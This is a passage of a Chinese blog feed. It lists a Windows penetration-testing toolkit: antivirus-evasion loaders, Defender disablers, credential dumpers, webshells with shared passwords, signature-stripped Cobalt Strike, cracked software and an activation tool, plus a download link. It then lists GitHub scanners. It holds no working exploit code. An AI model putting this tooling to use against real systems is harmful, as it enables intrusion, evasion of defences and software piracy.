class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br></pre></td><td class="code"><pre><span class="line">1. 系统环境类：</span><br><span class="line">- Directx</span><br><span class="line">- Net Framework 3.5</span><br><span class="line">- Net Framework 4.72</span><br><span class="line">- Visual basic virtual machine</span><br><span class="line">- Microsoft C runtime library</span><br><span class="line">- Microsoft visual C++ 2005-2019</span><br><span class="line">- 集成常用字库</span><br><span class="line">2. WindowsApp类：</span><br><span class="line">- WSL kali linux</span><br><span class="line">- Windows Terminal（已替换默认cmd）</span><br><span class="line">3. 其他工具类 （C:\Softwares）：</span><br><span class="line">- aact: 激活工具（一键激活windows &amp; office）</span><br><span class="line">- bandicam: 视频录制工具（注册版）</span><br><span class="line">- bandizip: 压缩工具</span><br><span class="line">- chrome: 99.0 绿色修改版</span><br><span class="line">  * 主要集成插件:</span><br><span class="line">    - adblock: 广告拦截工具</span><br><span class="line">    - adobe acrobat：pdf工具</span><br><span class="line">    - charset：修改网页编码工具</span><br><span class="line">    - chrome 清理大师: chrome清理工具</span><br><span class="line">    - editthiscookie: cookie编辑工具</span><br><span class="line">    - fofa pro view：fofa工具</span><br><span class="line">    - funnel search：google搜索工具</span><br><span class="line">    - hackbar：hackbar</span><br><span class="line">    - infinity：标签页工具</span><br><span class="line">    - ip address and domain inf: ip&amp;domain探测工具</span><br><span class="line">    - ip whois: whois 探测工具</span><br><span class="line">    - neater bookmarks: 书签管理工具</span><br><span class="line">    - octotree: github资源树查看工具</span><br><span class="line">    - onetab：标签管理工具</span><br><span class="line">    - postwoman：接口调试工具</span><br><span class="line">    - proxy switchyomega：代理切换工具</span><br><span class="line">    - seoquake：网页统计工具</span><br><span class="line">    - supercopy：超级复制</span><br><span class="line">    - toolbox 常用工具: 集成常用小工具</span><br><span class="line">    - wappalyzer：网页技术分析工具</span><br><span class="line">    - whatruns：网页技术分析工具</span><br><span class="line">    - yet another drag and go: 超链接拖拽新窗口打开</span><br><span class="line">- contextmenumanager：右键菜单管理工具</span><br><span class="line">- dism++: 系统调节工具</span><br><span class="line">- everything: 搜索工具（已禁用windows自带搜索）</span><br><span class="line">- fdm：下载工具</span><br><span class="line">- google earth：谷歌地球</span><br><span class="line">- hackbgrt：修改windows启动icon</span><br><span class="line">- honeyview: 看图工具</span><br><span class="line">- huorong: 杀毒工具（c:\penetration 为白名单）</span><br><span class="line">- icon：第三方图标包</span><br><span class="line">- iobit:</span><br><span class="line">  * uninstaller: 卸载工具（注册版）</span><br><span class="line">  * advanced systemcare: 优化清理工具（注册版）</span><br><span class="line">  * smart defrag: 磁盘碎片整理工具（注册版）</span><br><span class="line">- mactype：字体管理工具（已修改系统默认字体为Mac苹方体）</span><br><span class="line">- maye: 快捷启动工具</span><br><span class="line">- meitu：美图秀秀</span><br><span class="line">- oldnewexplorer: 资源管理器调节工具</span><br><span class="line">- pcmaster: 系统调整工具</span><br><span class="line">  * 已创建右键快捷菜单：</span><br><span class="line">    - 在此处打开terminal终端</span><br><span class="line">    - 在此处打开kali linux终端</span><br><span class="line">    - 在此处打开notepad</span><br><span class="line">    - 控制面板</span><br><span class="line">    - 计算器</span><br><span class="line">    - 注册表</span><br><span class="line">- pdf：极速pdf</span><br><span class="line">- potplayer: 视频播放工具</span><br><span class="line">- refresh：刷新图标缓存</span><br><span class="line">- snipaste: 截图工具</span><br><span class="line">- telegram：电报客户端</span><br><span class="line">- wps：wps去广告版</span><br><span class="line">- youdaodict：有道词典（注册版）（已集成离线翻译库）</span><br><span class="line">4. 渗透测试类（C:\Penetration）：</span><br><span class="line">- 常用的python及csharp脚本类工具均配有start.bat。</span><br><span class="line">  * 注明工具版本及更新时间</span><br><span class="line">  * 注明依赖环境</span><br><span class="line">  * 注明主要参数</span><br><span class="line">  * 注明简要用法（给工具不给用法的都是耍流氓）</span><br><span class="line">[+] AndroidTools 安卓工具:</span><br><span class="line">- apktool：apk反编译工具</span><br><span class="line">- dex2jar：dex打包工具</span><br><span class="line">- ldplayer：雷电安卓模拟器</span><br><span class="line">[+] AntivirusTools 免杀工具：</span><br><span class="line">- avevasion：https://github.com/1y0n/av_evasion_tool</span><br><span class="line">- bypass-antivirus：免杀教程</span><br><span class="line">- charlotte：https://github.com/9emin1/charlotte</span><br><span class="line">- cool：https://github.com/ed1s0nz/cool</span><br><span class="line">- crossnet：https://github.com/dr0op/crossnet-beta</span><br><span class="line">- darkarmour：https://github.com/bats3c/darkarmour</span><br><span class="line">- shellcodeloader：https://github.com/knownsec/shellcodeloader</span><br><span class="line">- vmprotect: 加壳工具（商业加壳，生成exe体积大）</span><br><span class="line">- vprotect: 加壳工具（商业加壳，生成exe体积较大）</span><br><span class="line">- zhetian：遮天shellcode加载工具（https://github.com/yqcs/ZheTian）</span><br><span class="line">[+] ConnectTools 连接工具:</span><br><span class="line">- anydesk</span><br><span class="line">- filezilla</span><br><span class="line">- finalshell</span><br><span class="line">- teamviewer</span><br><span class="line">- xmanager</span><br><span class="line">[+] CrackTools 破解工具:</span><br><span class="line">- access password recovery: access 密码破解工具</span><br><span class="line">- archive password recovery: zip &amp; rar 密码破解工具</span><br><span class="line">- office password recovery: office 密码破解工具</span><br><span class="line">- pdf password recovery: pdf 密码破解工具</span><br><span class="line">[+] DatabaseTools 数据库工具:</span><br><span class="line">- navicat premium: 数据库连接管理工具</span><br><span class="line">- neo4j：neo4j数据库管理工具</span><br><span class="line">- sharp sql tools：mssql数据库利用工具</span><br><span class="line">- sqlite：sqlite数据库管理工具</span><br><span class="line">- sqlknife：mssql数据库利用工具</span><br><span class="line">- sqlmap: 注入工具</span><br><span class="line">- sylas：mssql &amp; orcle &amp; postgresql数据库利用工具</span><br><span class="line">- toad：oracle数据库管理工具</span><br><span class="line">[+] DictionaryTools 字典工具:</span><br><span class="line">- mutoudic：木头字典生成工具（注册版）</span><br><span class="line">- pentestdicts：https://github.com/ppbibo/pentesterspecialdict</span><br><span class="line">- pwdbud：字典生成工具（https://github.com/ort4u/PwdBUD）</span><br><span class="line">[+] DiskTools 磁盘工具:</span><br><span class="line">- diskgenius: 专业版（可恢复硬盘数据）</span><br><span class="line">- ssdfresh：ssd优化工具</span><br><span class="line">[+] EditTools 编辑工具:</span><br><span class="line">- 010editor: 十六进制编辑工具（注册版）</span><br><span class="line">- alldup：重复文件搜索工具</span><br><span class="line">- batchren: 批量重命名工具</span><br><span class="line">- beyond compare：文件对比工具</span><br><span class="line">- ctfcrack: 米斯特安全团队工具</span><br><span class="line">- findstr: 文本检索工具</span><br><span class="line">- jd-gui: java查看编辑工具</span><br><span class="line">- jsonview: json查看编辑工具</span><br><span class="line">- log parse：windows日志分析工具</span><br><span class="line">- log parse lizard：windows日志分析工具（图形化）</span><br><span class="line">- notepad++: 编辑工具</span><br><span class="line">  * 添加右键菜单：使用Notepad编辑</span><br><span class="line">- pst converter：pst邮件转换工具</span><br><span class="line">- rapid environment: 环境变量编辑工具</span><br><span class="line">- sharp sword：csharp版本word查看工具</span><br><span class="line">- sublime: 编辑工具（注册版）</span><br><span class="line">  * 添加右键菜单：使用Sublime编辑</span><br><span class="line">- xmind：思维导图工具</span><br><span class="line">[+] ExpolitTools 漏洞工具:</span><br><span class="line">- cms hunter:https://github.com/SecWiki/CMS-Hunter</span><br><span class="line">- exphub：https://github.com/zhzyker/exphub</span><br><span class="line">- middleware-vulnerability-detection：https://github.com/mai-lang-chai/middleware-vulnerability-detection</span><br><span class="line">- system-vulnerability：https://github.com/mai-lang-chai/system-vulnerability</span><br><span class="line">- vulmap：web漏扫验证工具（https://github.com/zhzyker/vulmap）</span><br><span class="line">- vulnerability：https://github.com/edgesecurityteam/vulnerability</span><br><span class="line">- 更多漏洞exp见 c:\Penetration\ExpolitTools（漏洞exp较多，请善用everything搜索）</span><br><span class="line">[+] IntranetTools 内网工具:</span><br><span class="line">- abptts：内网穿透工具</span><br><span class="line">- add user: 添加用户工具</span><br><span class="line">- ad explore：ldap工具</span><br><span class="line">- blood hound：域渗透分析工具</span><br><span class="line">- defeat defender：关闭defender工具</span><br><span class="line">- dismap：内网漏洞扫描工具</span><br><span class="line">- domain tools：域渗透工具</span><br><span class="line">- earth worm: 内网穿透工具</span><br><span class="line">- frp: 内网穿透工具（https://github.com/fatedier/frp）</span><br><span class="line">- fscan：内网扫描工具（https://github.com/shadow1ng/fscan）</span><br><span class="line">- homework of powershell：3gstudent powershell工具</span><br><span class="line">- hydra: 口令爆破工具</span><br><span class="line">- impacket：内网协议工具（https://github.com/SecureAuthCorp/impacket）</span><br><span class="line">- invoke-obfuscation：powershell工具（https://github.com/danielbohannon/Invoke-Obfuscation）</span><br><span class="line">- kscan：内网扫描工具（https://github.com/lcvvvv/kscan）</span><br><span class="line">- ladon：内网扫描工具（小密圈9.1.4版本）</span><br><span class="line">- lcx：端口转发工具</span><br><span class="line">- ldap admin：ldap工具</span><br><span class="line">- mimikatz：密码抓取工具（文件夹下集成下列密码抓取工具）</span><br><span class="line">  * gosecretsdump</span><br><span class="line">  * hklm</span><br><span class="line">  * kekeo</span><br><span class="line">  * lazagne</span><br><span class="line">  * mimipenguin</span><br><span class="line">  * ntdsdumpex</span><br><span class="line">  * procdump</span><br><span class="line">  * pwdump</span><br><span class="line">  * quarkspw dump</span><br><span class="line">- nc: 监听工具</span><br><span class="line">- neo-regeorg：regeorg改良版（https://github.com/L-codes/Neo-reGeorg）</span><br><span class="line">- openrdp：开启远程桌面工具</span><br><span class="line">- pe：冰封pe iso镜像</span><br><span class="line">- powershdll：powershell工具</span><br><span class="line">- ps2exe：powershell转exe工具</span><br><span class="line">- pstools：微软官方psexec工具</span><br><span class="line">- reverseshell：反弹shell工具</span><br><span class="line">- revsh：内网穿透工具（https://github.com/emptymonkey/revsh）</span><br><span class="line">- scrun：k8 shellcode加载工具</span><br><span class="line">- sharp tools：</span><br><span class="line">  * sharp adi dnsdump：域dns枚举工具</span><br><span class="line">  * sharp decrypt pwd：浏览器密码解密工具</span><br><span class="line">  * sharp event log：日志分析工具</span><br><span class="line">  * sharp hound：域渗透分析工具</span><br><span class="line">  * sharp net check：出网探测工具</span><br><span class="line">- socks over rdp：rdp协议内网穿透工具</span><br><span class="line">- spp：内网穿透工具（https://github.com/esrrhs/spp）</span><br><span class="line">- stowaway：内网穿透工具（https://github.com/ph4ntonn/Stowaway）</span><br><span class="line">- wce：windows凭证编辑工具</span><br><span class="line">- wget：下载工具</span><br><span class="line">- wmihacker：wmi渗透工具</span><br><span class="line">- xray：扫描工具（https://github.com/chaitin/xray）</span><br><span class="line">- 更多内网工具见 C:\Penetration\IntranetTools</span><br><span class="line">[+] OfficeTools 办公工具：</span><br><span class="line">- adobe acrobat dc 2020：PDF编辑工具</span><br><span class="line">- adobe audition 2020：音频编辑工具</span><br><span class="line">- adobe photoshop 2020：图片编辑工具</span><br><span class="line">- office 六件套: word + excel + powerpoint + access + onenote + outlook</span><br><span class="line">- wps三件套：word + excel + powerpoint</span><br><span class="line">[+] ProgramTools 编程工具：</span><br><span class="line">- golang</span><br><span class="line">- java：</span><br><span class="line">  * jre1.8.0：已配置环境变量，系统默认调用java8</span><br><span class="line">  * openjdk15.0.2：绿色版，如有特殊软件需要java15环境运行可直接调用/bin/java.exe即可</span><br><span class="line">- python：</span><br><span class="line">  * python2：python2命令启动（python2 test.py）</span><br><span class="line">  * python3：python3命令启动（python3 test.py）</span><br><span class="line">  * 已集成本镜像所有python3工具的pip依赖库</span><br><span class="line">  * 使用pip命令调用python3 pip</span><br><span class="line">- tdm gcc</span><br><span class="line">- visual studio 2015</span><br><span class="line">[+] ReverseTools 逆向工具：</span><br><span class="line">- dnspy：csharp逆向工具</span><br><span class="line">- exescope：exe编辑工具</span><br><span class="line">- green helper：exe绿化工具</span><br><span class="line">- olly debug：exe调试工具</span><br><span class="line">- peidtool：查壳工具</span><br><span class="line">- signtool：签名伪造工具</span><br><span class="line">- upxshell：upx加壳工具</span><br><span class="line">- x64dbg：exe调试工具</span><br><span class="line">[+] ScanTools 扫描工具:</span><br><span class="line">- acunetix: web vulnerability scanner 14.7.220401065（注册版）（可扫描Log4j &amp; spring core rce）</span><br><span class="line">  * user: admin@awvs.com</span><br><span class="line">  * pass: Admin@awvs.com</span><br><span class="line">- appscan：app scan 10.0.7（注册版）</span><br><span class="line">- nmap：端口扫描工具</span><br><span class="line">- router scan: C段扫描工具</span><br><span class="line">- snet cracker: 弱口令扫描工具</span><br><span class="line">- scan box:</span><br><span class="line">  * avscan 杀毒软件检测工具：</span><br><span class="line">    - checkav</span><br><span class="line">  * leakscan 敏感文件扫描工具：</span><br><span class="line">    - dirmap：https://github.com/H4ckForJob/dirmap</span><br><span class="line">    - dirsearch：https://github.com/maurosoria/dirsearch</span><br><span class="line">    - packerfuzzer：https://github.com/rtcatc/Packer-Fuzzer</span><br><span class="line">    - scantools：https://gitee.com/windyjxx/ScanTools</span><br><span class="line">    - yujian</span><br><span class="line">    - githack</span><br><span class="line">    - ...</span><br><span class="line">  * subdomain 子域名探测工具：</span><br><span class="line">    - fofa view：fofa查询工具</span><br><span class="line">    - oneforall：https://github.com/shmilylty/OneForAll</span><br><span class="line">    - securitytrails</span><br><span class="line">    - sublist3r：https://github.com/aboul3la/Sublist3r</span><br><span class="line">    - subfinder：https://github.com/projectdiscovery/subfinder</span><br><span class="line">    - webtitle</span><br><span class="line">    - domaininfo</span><br><span class="line">    - webbatchrequest</span><br><span class="line">    - ...</span><br><span class="line">- 更多扫描工具见 C:\Penetration\ScanTools\ScanBox（其中scanbox项目 https://github.com/we5ter/scanners-box）</span><br><span class="line">[+] ShellTools 权限工具:</span><br><span class="line">- antsword: 蚁剑（已集成插件）（https://github.com/AntSwordProject/AntSword-Loader）</span><br><span class="line">- behinder: 冰蝎（shell密码统一为cmd）（https://github.com/rebeyond/Behinder）</span><br><span class="line">  * behinder 2.0.1</span><br><span class="line">  * behinder 3.0 beta11</span><br><span class="line">  * behinder 3.3.2修改版（https://github.com/angels520/rebeyond-Mode）</span><br><span class="line">- cobaltstrike: 4.4汉化版</span><br><span class="line">  * 使用csagent汉化（https://github.com/Twi1ight/CSAgent）</span><br><span class="line">  * 去除cobaltstrike特征（修改端口 + 重签证书 + random.profile）</span><br><span class="line">  * vps启动teamserver：./teamserver ip port random.profile</span><br><span class="line">  * 集成插件：（C:\Penetration\ShellTools\CobaltStrike\scripts）</span><br><span class="line">    - adcollection</span><br><span class="line">    - bypassav</span><br><span class="line">    - erebus</span><br><span class="line">    - eval</span><br><span class="line">    - eventlogmaster</span><br><span class="line">    - ladon</span><br><span class="line">    - mikasa</span><br><span class="line">    - taowu</span><br><span class="line">- gbbypass：jsp免杀工具（https://github.com/czz1233/GBByPass）</span><br><span class="line">- godzilla：哥斯拉（密码为默认pass + key）（https://github.com/BeichenDream/Godzilla）</span><br><span class="line">- kali：wsl kali linux 2022.1</span><br><span class="line">  * 用户：</span><br><span class="line">    - user：kali pass：kali</span><br><span class="line">    - user：root pass：root</span><br><span class="line">  * 修改软件源为阿里云 + 清华大学</span><br><span class="line">  * 完整安装kali linux所有软件包</span><br><span class="line">  * 安装xrdp服务，可用rdp客户端打开kali linux图形化模式</span><br><span class="line">    - kali命令行模式下运行/home/kali/xrdp-restart.sh打开xrdp服务，即可使用rdp登录kali</span><br><span class="line">    - rdp配置：127.0.0.1:3390</span><br><span class="line">    - kali命令行模式下运行/home/kali/xrdp-stop.sh关闭xrdp服务</span><br><span class="line">    - 如果不需要使用图形化模式，建议关闭xrdp服务（非常占用资源）</span><br><span class="line">- pyshell：python版shell管理工具（https://github.com/JoelGMSec/PyShell）</span><br><span class="line">- skyscorpion：天蝎（shell密码统一为cmd）（https://github.com/shack2/skyscorpion）</span><br><span class="line">- shell:免杀一句话木马（密码统一为cmd）</span><br><span class="line">- webshell: webshell收集项目（https://github.com/tennc/webshell）</span><br><span class="line">[+] StegaTools 隐写工具：</span><br><span class="line">- beyond compare：对比工具</span><br><span class="line">- binwalk：分解工具</span><br><span class="line">- blind-watermark：盲水印工具</span><br><span class="line">- crc calculator：校验工具</span><br><span class="line">- f5：f5隐写工具</span><br><span class="line">  * f5-steganography</span><br><span class="line">  * lsb-steganography</span><br><span class="line">  * steganography</span><br><span class="line">- foremost：分离工具</span><br><span class="line">- giftools：gif工具</span><br><span class="line">- gnuplot：</span><br><span class="line">- jphs：jpeg工具</span><br><span class="line">- mp3steno：mp3工具</span><br><span class="line">- namo gif animator：gif工具</span><br><span class="line">- openhashtab：hash工具</span><br><span class="line">- outguess：图片工具</span><br><span class="line">- pixrecovery：</span><br><span class="line">- pngcheck：png工具</span><br><span class="line">- qr_research：二维码工具</span><br><span class="line">- stegdetect：</span><br><span class="line">- steghide：捆绑工具</span><br><span class="line">- stegsolve：分离工具</span><br><span class="line">- tweakpng：png工具</span><br><span class="line">- wbstego：</span><br><span class="line">- ctf 密码学知识点总结</span><br><span class="line">- ctf 逆向知识点总结</span><br><span class="line">- ctf 隐写术知识点总结</span><br><span class="line">[+] TrafficTools 流量工具:</span><br><span class="line">- burpsuite: </span><br><span class="line">  * burpsuite 2022.1.1汉化版（https://github.com/funkyoummp/burpsuitecn）</span><br><span class="line">  * 集成插件：</span><br><span class="line">    - vulners scanner</span><br><span class="line">    - changeu</span><br><span class="line">    - chunked coding converter</span><br><span class="line">    - domain hunter</span><br><span class="line">    - fake ip</span><br><span class="line">    - hackbar</span><br><span class="line">    - sqlmap4burp</span><br><span class="line">    - turbo intruder</span><br><span class="line">- fiddler: 流量抓包工具（汉化版）</span><br><span class="line">- ftpservers: ftp开启工具  </span><br><span class="line">- hack firefox: firefox 49.0 （集成插件版）</span><br><span class="line">- ipchanger: ip代理工具  </span><br><span class="line">- phpstudy: 集成环境 </span><br><span class="line">  * 集成thinkphp3.1.3 — 5.0.24全部版本</span><br><span class="line">- proxifier: 流量代理工具  </span><br><span class="line">- shadowsocks: socks代理工具 </span><br><span class="line">- torbrowser: 洋葱浏览器</span><br><span class="line">- wireshark: 流量抓包分析工具</span><br><span class="line">下载链接：</span><br></pre></td></tr></table></figure><p>链接：<a href="https://pan.xunlei.com/s/VMzuZMn_adcsVsHKVk7gw6HhA1">https://pan.xunlei.com/s/VMzuZMn_adcsVsHKVk7gw6HhA1</a> 提取码：dhck</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​                                     @真琴师傅基于Windows打造的一个渗透测试套件工具包。&lt;/p&gt;
&lt;p&gt;github项目地址&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/makoto56/penetra</summary>
      
    
    
    
    <category term="渗透" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>github上开源扫描器集合</title>
    <link href="http://example.com/2022/01/07/github%E4%B8%8A%E5%BC%80%E6%BA%90%E6%89%AB%E6%8F%8F%E5%99%A8%E9%9B%86%E5%90%88/"/>
    <id>http://example.com/2022/01/07/github%E4%B8%8A%E5%BC%80%E6%BA%90%E6%89%AB%E6%8F%8F%E5%99%A8%E9%9B%86%E5%90%88/</id>
    <published>2022-01-07T08:43:07.000Z</published>
    <updated>2022-01-07T08:45:48.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介#"></a>简介#</h3><p>Scanners-Box是一个集合github平台上的安全行业从业人员自研开源扫描器的仓库，包括子域名枚举、数据库漏洞扫描、弱口令或信息泄漏扫描、端口扫描、指纹识别以及其他大型扫描器或模块化扫描器；<strong>该仓库只收录各位网友自己编写的一般性开源扫描器，类似nmap、w3af、brakeman等知名扫描工具不收录</strong>。</p><h4 id="子域名枚举"><a href="#子域名枚举" class="headerlink" title="子域名枚举#"></a>子域名枚举#</h4><ul><li>lijiejie/subDomainsBrute (经典的子域名爆破枚举脚本)</li><li>ring04h/wydomain (子域名字典穷举)</li><li>le4f/dnsmaper (子域名枚举与地图标记)</li><li>0xbug/orangescan (在线子域名信息收集工具)</li><li>TheRook/subbrute （根据DNS记录查询子域名)</li><li>We5ter/GSDF (基于谷歌SSL透明证书的子域名查询脚本)</li><li>mandatoryprogrammer/cloudflare_enum （使用CloudFlare进行子域名枚举的脚本）</li><li>guelfoweb/knock (Knock子域名获取，可用于查找子域名接管漏洞)</li><li>Evi1CLAY/CoolPool （多方式收集目标子域名信息）</li><li>code-scan/BroDomain (兄弟域名查询）</li><li>chuhades/dnsbrute (高效的子域名爆破工具)</li></ul><h4 id="数据库扫描"><a href="#数据库扫描" class="headerlink" title="数据库扫描#"></a>数据库扫描#</h4><ul><li>0xbug/SQLiScanner (一款基于SQLMAP和Charles的被动SQL注入漏洞扫描工具)</li><li>stamparm/DSSS (99行代码实现的sql注入漏洞扫描器)</li><li>LoRexxar/Feigong （针对各种情况自由变化的MySQL注入脚本）</li><li>youngyangyang04/NoSQLAttack (一款针对mongoDB的攻击工具)</li><li>Neohapsis/bbqsql （SQL盲注利用框架）</li><li>NetSPI/PowerUpSQL （攻击SQLSERVER的Powershell脚本框架）</li><li>WhitewidowScanner/whitewidow (又一款数据库扫描器)</li><li>stampery/mongoaudit (MongoDB审计及渗透工具）</li><li>torque59/Nosql-Exploitation-Framework (NoSQL扫描/爆破工具）</li></ul><h4 id="弱口令或信息泄漏扫描"><a href="#弱口令或信息泄漏扫描" class="headerlink" title="弱口令或信息泄漏扫描#"></a>弱口令或信息泄漏扫描#</h4><ul><li>lijiejie/htpwdScan (一个简单的HTTP暴力破解、撞库攻击脚本)</li><li>lijiejie/BBScan (一个迷你的信息泄漏批量扫描脚本)</li><li>lijiejie/GitHack (.git文件夹泄漏利用工具)</li><li><a href="https://github.com/wilson9x1/fenghuangscanner_v3">https://github.com/wilson9x1/fenghuangscanner_v3</a> (端口及弱口令检测)</li><li>ysrc/F-Scrack （对各类服务进行弱口令检测的脚本)</li><li>Mebus/cupp （根据用户习惯生成弱口令探测字典脚本）</li><li>RicterZ/genpAss （中国特色的弱口令生成器）</li><li>netxfly/crack_ssh （go写的协程版的ssh\redis\mongodb弱口令破解工具）</li><li>n0tr00t/Sreg (通过输入email、phone、username的返回用户注册的所有互联网护照信息)</li><li>repoog/GitPrey (GitHub敏感信息扫描工具)</li><li>dxa4481/truffleHog (GitHub敏感信息扫描工具,包括检测commit等)</li><li>LandGrey/pydictor (暴力破解字典建立工具)</li></ul><h4 id="物联网设备扫描"><a href="#物联网设备扫描" class="headerlink" title="物联网设备扫描#"></a>物联网设备扫描#</h4><ul><li>rapid7/IoTSeeker （物联网设备默认密码扫描检测工具)</li><li>shodan-labs/iotdb (使用nmap扫描IoT设备)</li><li>jh00nbr/Routerhunter-2.0 （路由器设备漏洞扫描利用)</li><li>scu-igroup/telnet-scanner (telnet服务密码撞库)</li></ul><h4 id="XSS扫描"><a href="#XSS扫描" class="headerlink" title="XSS扫描#"></a>XSS扫描#</h4><ul><li>shawarkhanethicalhacker/BruteXSS （Cross-Site Scripting Bruteforcer）</li><li>1N3/XSSTracer (A small python script to check for Cross-Site Tracing)</li><li><a href="https://github.com/0x584A/fuzzXssPHP">https://github.com/0x584A/fuzzXssPHP</a> (PHP版本的反射型xss扫描)</li><li>chuhades/xss_scan (批量扫描xss的python脚本）</li><li>BlackHole1/autoFindXssAndCsrf (自动化检测页面是否存在XSS和CSRF漏洞的浏览器插件）</li><li>UltimateHackers/XSSight (自动化XSS扫描）</li></ul><h4 id="企业网络自检"><a href="#企业网络自检" class="headerlink" title="企业网络自检#"></a>企业网络自检#</h4><ul><li>sowish/LNScan （详细的内部网络信息扫描器）</li><li>SkyLined/LocalNetworkScanner (javascript实现的本地网络扫描器)</li><li>ysrc/xunfeng (网络资产识别引擎，漏洞检测引擎）</li><li>laramies/theHarvester （企业被搜索引擎收录敏感资产信息监控脚本：员工邮箱、子域名、Hosts）</li><li>x0day/Multisearch-v2 (bing、google、360、zoomeye等搜索引擎聚合搜索，可用于发现企业被搜索引擎收录的敏感资产信息）</li></ul><h4 id="webshell检测以及病毒分析工具"><a href="#webshell检测以及病毒分析工具" class="headerlink" title="webshell检测以及病毒分析工具#"></a>webshell检测以及病毒分析工具#</h4><ul><li>We5ter/Scanners-Box （简单的php后门检测工具以及webshell样本库）</li><li>ym2011/ScanBackdoor （Webshell扫描工具）</li><li><a href="https://github.com/yassineaddi/BackdoorMan">https://github.com/yassineaddi/BackdoorMan</a> （A toolkit find malicious, hidden and suspicious PHP scripts and shells in a chosen destination）</li><li>he1m4n6a/findWebshell （又一款webshell检测工具)</li><li>Tencent/HaboMalHunter （哈勃分析系统，linux系统病毒分析及安全检测）</li><li>PlagueScanner/PlagueScanner (使用python实现的集成ClamAV、ESET、Bitdefender的反病毒引擎)</li><li>nbs-system/php-malware-finder (一款高效率PHP-webshell扫描工具)</li><li>emposha/PHP-Shell-Detector (测试效率高达99%的webshell检测工具)</li></ul><h4 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透#"></a>内网渗透#</h4><ul><li>0xwindows/VulScritp （企业内网渗透脚本，包括banner扫描、端口扫描；phpmyadmin、jenkins等通用漏洞利用等）</li><li>lcatro/network_backdoor_scanner （基于网络流量的内网探测框架）</li><li>fdiskyou/hunter （调用 Windows API 枚举用户登录信息）</li><li>BlackHole1/WebRtcXSS （自动化利用XSS入侵内网）</li></ul><h4 id="端口扫描、指纹识别以及中间件扫描"><a href="#端口扫描、指纹识别以及中间件扫描" class="headerlink" title="端口扫描、指纹识别以及中间件扫描#"></a>端口扫描、指纹识别以及中间件扫描#</h4><ul><li>ring04h/wyportmap (目标端口扫描+系统服务指纹识别)</li><li>ring04h/weakfilescan (动态多线程敏感信息泄露检测工具)</li><li>EnableSecurity/wafw00f (WAF产品指纹识别)</li><li>rbsec/sslscan （ssl类型识别)</li><li>urbanadventurer/WhatWeb (web指纹识别)</li><li>tanjiti/FingerPrint (web应用指纹识别)</li><li>nanshihui/Scan-T （网络爬虫式指纹识别)</li><li>OffensivePython/Nscan (a fast Network scanner inspired by Masscan and Zmap)</li><li>ywolf/F-NAScan (网络资产信息扫描, ICMP存活探测,端口扫描，端口指纹服务识别）</li><li>ywolf/F-MiddlewareScan （中间件扫描）</li><li><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a> (Web path scanner)</li><li><a href="https://github.com/x0day/bannerscan">https://github.com/x0day/bannerscan</a> （C段Banner与路径扫描）</li><li>RASSec/RASscan (端口服务扫描)</li><li><a href="https://github.com/3xp10it/bypass_waf">https://github.com/3xp10it/bypass_waf</a> （waf自动暴破）</li><li><a href="https://github.com/3xp10it/xcdn">https://github.com/3xp10it/xcdn</a> (尝试找出cdn背后的真实ip)</li><li>Xyntax/BingC （基于Bing搜索引擎的C段/旁站查询，多线程，支持API）</li><li>Xyntax/DirBrute （多线程WEB目录爆破工具）</li><li>zer0h/httpscan （一个爬虫式的网段Web主机发现小工具）</li><li>lietdai/doom （thorn上实现的分布式任务分发的ip端口漏洞扫描器）</li><li><a href="https://github.com/chichou/grab.js">https://github.com/chichou/grab.js</a> (类似 zgrab 的快速 TCP 指纹抓取解析工具，支持更多协议)</li><li>Nitr4x/whichCDN (CDN识别、检测）</li><li>secfree/bcrpscan (基于爬虫的web路径扫描器)</li><li>mozilla/ssh_scan (服务器ssh配置信息扫描）</li></ul><h4 id="专用扫描器"><a href="#专用扫描器" class="headerlink" title="专用扫描器#"></a>专用扫描器#</h4><ul><li>blackye/Jenkins (Jenkins漏洞探测、用户抓取爆破)</li><li>code-scan/dzscan (discuz扫描)</li><li>chuhades/CMS-Exploit-Framework (CMS攻击框架)</li><li>lijiejie/IIS_shortname_Scanner (an IIS shortname 